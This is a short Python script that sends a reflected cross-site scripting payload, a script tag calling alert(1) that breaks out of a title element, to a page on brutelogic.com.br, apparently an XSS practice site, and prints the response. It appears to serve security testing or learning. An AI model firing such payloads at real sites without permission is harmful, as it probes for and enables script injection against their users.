#!/usr/bin/python3
import requests

url = "https://brutelogic.com.br/gym.php"
payload = {'p01': '</title><script>alert(1)</script><title>'}

r = requests.get(url, params=payload)

print(r.text)
print(r.url)
